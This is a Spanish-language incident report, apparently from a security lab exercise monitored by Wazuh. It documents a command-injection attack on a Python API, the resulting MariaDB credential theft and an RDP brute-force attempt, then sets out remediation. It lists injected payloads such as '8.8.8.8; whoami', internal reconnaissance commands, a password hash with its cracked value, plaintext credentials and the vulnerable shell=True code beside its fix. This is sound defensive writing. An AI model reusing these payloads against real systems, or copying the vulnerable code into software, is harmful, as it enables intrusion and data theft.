| Usuario | Sistema | Contexto | Credencial | Estado |
|---------|---------|----------|-----------|--------|
| root | MariaDB | Enumeración inicial (100402) | Sin contraseña (anónimo) | Cuenta vulnerable |
| TCFD | MariaDB | Acceso inicial (100403) | Sin contraseña | Cuenta débil |
| labadmin | MariaDB | Escalada de privilegios (100405-406) | password123 | **COMPROMETIDA** |
| Administrador | Windows | Intento fuerza bruta (100503) | WinLab-2026-03 | Intento fallido |
| administrador | (de credentials DB) | Exfiltrado (100406) | WinLab-2026-03 | **EXPUESTO** |

---

#### 🔐 Hashes y Credenciales Extraídas

| Tipo | Valor | Usuario | Sistema | Cracking Time |
|------|-------|---------|---------|----------------|
| SHA1 (MySQL) | `*A0F874BC7F54EE086FCE60A37CE7887D8B31086B` | labadmin | MariaDB | ~30 segundos |
| Plaintext | password123 | labadmin | Crackeado de hash | — |
| Plaintext | WinLab-2026-03 | administrador | Exfiltrado de DB | — |
| Plaintext | WebLab-2026-02 | webadmin | Exfiltrado de DB | — |
| Plaintext | BackupLab-2026-04 | svc_backup | Exfiltrado de DB | — |
| Plaintext | BackupLab-2026-05 | backup_operator | Exfiltrado de DB | — |
| Plaintext | FinanceLab-2026-06 | fin_user | Exfiltrado de DB | — |

---

#### 🌐 Endpoints y Puertos

| Protocolo | IP:Puerto | Servicio | Vulnerability | Estado |
|-----------|-----------|----------|----------------|--------|
| HTTP | 192.168.3.100:8080 | API Infrastructure | OS Command Injection | Vulnerable |
| TCP | 172.18.0.3:3306 | MariaDB | Weak Auth + Data Exposure | Comprometido |
| TCP | 192.168.3.10:3389 | Windows RDP | Missing MFA | Atacado |
| TCP | 192.168.3.100:22 | SSH (Ubuntu) | No evaluado | Posible acceso |

---

#### 📝 Comandos/Queries Ejecutadas por Atacante

| Comando | Contexto | Alerta | Propósito |
|---------|----------|--------|-----------|
| `8.8.8.8; whoami` | /check-host | 100310 | Confirmar ejecución remota |
| `127.0.0.1; cat /proc/net/fib_trie` | /check-host | 100311 | Reconocer red interna Docker |
| `127.0.0.1; ping -c 1 172.18.0.3` | /check-host | 100312 | Descubrir host MariaDB |
| `SELECT user FROM mysql.user` | MariaDB | 100402 | Enumerar usuarios DB |
| `SELECT 1` | MariaDB (TCFD) | 100403 | Validar acceso |
| `SELECT CURRENT_USER()` | MariaDB | 100404 | Identificar usuario actual |
| `SHOW DATABASES` | MariaDB | 100405a | Listar bases disponibles |
| `SHOW TABLES` (corporate_assets) | MariaDB | 100405b | Enumerar tablas sensibles |
| `SELECT * FROM endpoints` | MariaDB | 100405c | Listar infraestructura |
| `SELECT * FROM credentials` | MariaDB | 100406 | Exfiltrar credenciales |

---

#### 📦 Bases de Datos y Tablas Afectadas

| Base de Datos | Tabla | Registros Expuestos | Datos Comprometidos |
|---------------|-------|-------------------|-------------------|
| corporate_assets | endpoints | 3 | IPs, puertos, estados de sistemas |
| corporate_assets | credentials | 6 | Usuarios y contraseñas (plaintext) |
| mysql | user | * | Hashes, permisos, hosts |

**Registros de `credentials` exfiltrados:**

- Administrador / WinLab-2026-03
- webadmin / WebLab-2026-02
- svc_backup / BackupLab-2026-04
- backup_operator / BackupLab-2026-05
- fin_user / FinanceLab-2026-06
- dbadmin / DBLab-2026-01

<br> 


---

#### 🔗 Archivos y Procesos Maliciosos

| Archivo/Proceso | Localización | Tipo | Acción |
|-----------------|--------------|------|--------|
| infrastructure-status-api | 192.168.3.100:8080 | API vulnerable | Punto de entrada |
| 4ca86714d046 | 172.18.0.2 (Docker) | Container ID | Acceso comprometido |
| 4ca86714d046 | 172.18.0.3 (Docker) | Container ID | Datos exfiltrados |
| netsh.exe | SERV-LAB (active-response) | Respuesta automática | Bloqueó IP atacante |

---

#### 🎯 MITRE ATT&CK Framework Mapeado

| Técnica | ID | Táctica | Alerta | Descripción |
|---------|----|---------|---------|----|
| Unix Shell | T1059.004 | Execution | 100310 | Command injection en /check-host |
| System Network Configuration Discovery | T1016 | Discovery | 100311 | cat /proc/net/fib_trie |
| Remote System Discovery | T1018 | Discovery | 100312 | Ping a host interno |
| Account Discovery | T1087 | Discovery | 100402 | SELECT user FROM mysql.user |
| Valid Accounts | T1078 | Initial Access, Persistence | 100403 | Autenticación TCFD/labadmin |
| System Owner/User Discovery | T1033 | Discovery | 100404 | SELECT CURRENT_USER() |
| Data from Information Repositories | T1213 | Collection | 100405, 100406 | SELECT * FROM endpoints/credentials |
| Brute Force | T1110 | Credential Access | 100503 | Fuerza bruta RDP |
| Password Guessing | T1110.001 | Credential Access | 100503 | Hidra contra Administrador |

---

#### 🔔 Indicadores Detectados por Wazuh

| Tipo de IOC | Valor | Detectado por | Acción |
|-------------|-------|---------------|--------|
| IP Maliciosa | 192.168.3.163 | 100503 + 657 | Bloqueada en firewall |
| Hash (Salted SHA1) | A0F874BC7F54EE086FCE60A37CE7887D8B31086B | Manual (John) | Contraseña crackeada |
| User Agent | hydra/[version] | Tráfico RDP | Identificado atacante |
| Command Pattern | `; whoami` | Regex en API logs | Bloquear separador ; |
| Query Pattern | `SELECT * FROM credentials` | MariaDB Audit | Auditar acceso datos |
| Event ID | 4625 (x7) | Windows Security | Fuerza bruta detectada |

-----

<br> 

## 🔒 Cierre del Caso — Recomendaciones de Remediación

---

### Qué pasó en resumen

El ataque duró 22 minutos. Detectamos 3 fases, paramos 2, y Wazuh bloqueó la 3era 
automáticamente. Windows no se comprometió. Ubuntu sí. MariaDB fue exfiltrada.

**Lo bueno:** Active Response funcionó en 2 segundos y salvó Windows.  
**Lo malo:** Ubuntu necesita rebuild completo.

---

### Acciones URGENTES (hoy-7 días)

**1. Rotar TODAS las credenciales que sacaron de MariaDB**

Estas quedaron comprometidas:
- administrador / WinLab-2026-03
- webadmin / WebLab-2026-02
- svc_backup / BackupLab-2026-04
- backup_operator / BackupLab-2026-05
- fin_user / FinanceLab-2026-06
- dbadmin / DBLab-2026-01

Hay que cambiarlas hoy. Sin excusas.

**2. Parchear la API — ya**

La API tiene `shell=True` sin validación. Eso es RCE garantizada. 

Código vulnerable:
```python
cmd = f"ping -c 1 {hostname}"
subprocess.run(cmd, shell=True)  # Si hostname = "8.8.8.8; whoami" → pum
```

Tiene que ser:
```python
# Validar
if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
    raise HTTPException(status_code=400)

# Sin shell=True
subprocess.run(['ping', '-c', '1', hostname])
```

Dev Team: 48 horas máximo. No reactivar sin esto.

**3. Limpiar MariaDB — eliminar cuentas anónimas**

```sql
DELETE FROM mysql.user WHERE User='';
FLUSH PRIVILEGES;
```

**4. Habilitar MFA en Windows**

Aunque cambié la contraseña de administrador, hay que agregar MFA para que no 
se repita. Si es rápido: NLA (Network Level Authentication).

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
  /v SecurityLayer /t REG_DWORD /d 2 /f
```

**5. Revisar logs**

Necesito confirmar que el atacante no dejó backdoors. Ver:
- `/var/log/api.log` en Ubuntu (qué comandos ejecutó)
- Event ID 4625 en Windows (intentos fallidos RDP)
- Audit logs de MariaDB (qué queries hizo)

---

### Acciones a mediano plazo (próximo mes)

**A. Hardening de MariaDB**

Cambiar contraseña de root, eliminar acceso remoto, crear usuario read-only para la 
app, encriptar la tabla de credenciales, habilitar auditoría. Todo en SQL directo.

**B. Segmentar la red**

Ahora todo está en la misma red. Si uno cae, todo cae. Hay que:
- DMZ: Solo la API (Ubuntu)
- Internal: MariaDB aislada
- Management: Windows separada

Con firewall en el medio bloqueando lateral movement.

**C. Implementar WAF (Web Application Firewall)**

Poner ModSecurity + Nginx enfrente de la API para bloquear inyecciones automáticamente.

**D. Encriptación en tránsito**

HTTPS en la API, TLS en MariaDB, TLS 1.2+ en RDP. Sin excusas.

**E. Vault de Secretos**

En lugar de credenciales en tabla de DB, usar HashiCorp Vault. Rotación automática cada 30 días.

**F. Parchado automático**

Linux: Unattended-upgrades (security patches automáticos)  
Windows: WSUS con aprobación automática de patches críticos

**G. Threat Hunting constante**

Cada semana buscar patterns de injection en los logs. Cada día revisar 
queries sospechosas a MariaDB. Cada minuto alertas en Wazuh si hay 5+ 
intentos fallidos de login.

---

### Métricas — Antes vs. Después

| Métrica | Antes | Después |
|---------|-------|---------|
| Cuentas sin MFA | 100% | 0% |
| Vulnerabilidades críticas sin parchear | 5 | 0 |
| Datos sensibles encriptados | 0% | 100% |
| Tiempo de respuesta (MTTR) | ~30 min | < 5 min |
| Tiempo de investigación (MTTI) | ~60 min | < 15 min |
| Segmentación de red | NO | SÍ |

El riesgo general baja de 7.9 (ALTO) a 1.6 (BAJO).

---

### Lo importante

**Sin implementar las acciones URGENTES en 7 días, el atacante (o alguien igual) 
vuelve a entrar por el mismo lado en 48-72 horas.**

No es dramatizar. Es el mismo vector. Ya lo probó. Ya sabe que funciona.

**CASO CERRADO**

```
Analista: Lucas Pizarro
Fecha: 2026-10-04
Estado: Resuelto pero requiere remediación inmediata
```

### Plan de Acción Inmediato (0-7 días)

#### CRÍTICO — Ejecutar YA

**1. Rotar Todas las Credenciales Exfiltradas**
